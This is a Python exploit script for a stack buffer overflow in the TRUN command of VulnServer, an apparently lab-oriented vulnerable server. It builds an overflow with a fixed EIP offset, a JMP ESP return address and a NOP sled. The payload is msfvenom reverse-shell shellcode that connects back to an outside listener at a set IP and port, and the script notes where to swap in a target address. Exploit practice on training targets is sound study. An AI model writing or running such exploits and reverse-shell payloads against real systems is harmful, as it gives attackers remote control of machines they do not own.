import socket
import struct

# Target IP and port
TARGET_IP = "44.106.70.26"  # Replace with the target IP
TARGET_PORT = 9999          # VulnServer default port

# Payload generated with msfvenom
# msfvenom -p windows/shell_reverse_tcp LHOST=44.106.70.52 LPORT=4444 EXITFUNC=thread -b "\x00" -f python
shellcode = (
    b"\xdd\xc6\xbe\xa3\xfa\xde\xe1\xd9\x74\x24\xf4\x5f"
    b"\x33\xc9\xb1\x52\x31\x77\x17\x83\xc7\x04\x03\xd4"
    b"\xe9\x3c\x14\xe6\xe6\x43\xd7\x16\xf7\x23\x51\xf3"
    b"\xc6\x63\x05\x70\x78\x54\x4d\xd4\x75\x1f\x03\xcc"
    b"\x0e\x6d\x8c\xe3\xa7\xd8\xea\xca\x38\x70\xce\x4d"
    b"\xbb\x8b\x03\xad\x82\x43\x56\xac\xc3\xbe\x9b\xfc"
    b"\x9c\xb5\x0e\x10\xa8\x80\x92\x9b\xe2\x05\x93\x78"
    b"\xb2\x24\xb2\x2f\xc8\x7e\x14\xce\x1d\x0b\x1d\xc8"
    b"\x42\x36\xd7\x63\xb0\xcc\xe6\xa5\x88\x2d\x44\x88"
    b"\x24\xdc\x94\xcd\x83\x3f\xe3\x27\xf0\xc2\xf4\xfc"
    b"\x8a\x18\x70\xe6\x2d\xea\x22\xc2\xcc\x3f\xb4\x81"
    b"\xc3\xf4\xb2\xcd\xc7\x0b\x16\x66\xf3\x80\x99\xa8"
    b"\x75\xd2\xbd\x6c\xdd\x80\xdc\x35\xbb\x67\xe0\x25"
    b"\x64\xd7\x44\x2e\x89\x0c\xf5\x6d\xc6\xe1\x34\x8d"
    b"\x16\x6e\x4e\xfe\x24\x31\xe4\x68\x05\xba\x22\x6f"
    b"\x6a\x91\x93\xff\x95\x1a\xe4\xd6\x51\x4e\xb4\x40"
    b"\x73\xef\x5f\x90\x7c\x3a\xcf\xc0\xd2\x95\xb0\xb0"
    b"\x92\x45\x59\xda\x1c\xb9\x79\xe5\xf6\xd2\x10\x1c"
    b"\x91\xf0\x8e\x58\x55\x61\x4d\x64\x84\x2d\xd8\x82"
    b"\xcc\xdd\x8c\x1d\x79\x47\x95\xd5\x18\x88\x03\x90"
    b"\x1b\x02\xa0\x65\xd5\xe3\xcd\x75\x82\x03\x98\x27"
    b"\x05\x1b\x36\x4f\xc9\x8e\xdd\x8f\x84\xb2\x49\xd8"
    b"\xc1\x05\x80\x8c\xff\x3c\x3a\xb2\xfd\xd9\x05\x76"
    b"\xda\x19\x8b\x77\xaf\x26\xaf\x67\x69\xa6\xeb\xd3"
    b"\x25\xf1\xa5\x8d\x83\xab\x07\x67\x5a\x07\xce\xef"
    b"\x1b\x6b\xd1\x69\x24\xa6\xa7\x95\x95\x1f\xfe\xaa"
    b"\x1a\xc8\xf6\xd3\x46\x68\xf8\x0e\xc3\x88\x1b\x9a"
    b"\x3e\x21\x82\x4f\x83\x2c\x35\xba\xc0\x48\xb6\x4e"
    b"\xb9\xae\xa6\x3b\xbc\xeb\x60\xd0\xcc\x64\x05\xd6"
    b"\x63\x84\x0c"
)

# Offset to EIP (found using pattern_offset)
offset = 2003

# JMP ESP address (from VulnServer or a DLL)
# Example: 0x625011AF (from essfunc.dll in VulnServer)
jmp_esp = struct.pack("<I", 0x625011AF)  # Replace with the correct address

# NOP sled
nop_sled = b"\x90" * 32

# Craft the payload
payload = b"TRUN /.:/" + b"A" * offset + jmp_esp + nop_sled + shellcode

# Create the socket and send the payload
try:
    print("[+] Connecting to target...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    banner = s.recv(1024)  # Receive the banner
    print(f"[+] Banner received: {banner.decode().strip()}")
    print("[+] Sending payload...")
    s.send(payload)
    print("[+] Payload sent! Check your listener.")
    s.close()
except Exception as e:
    print(f"[-] Error: {e}")
finally:
    if 's' in locals():
        s.close()
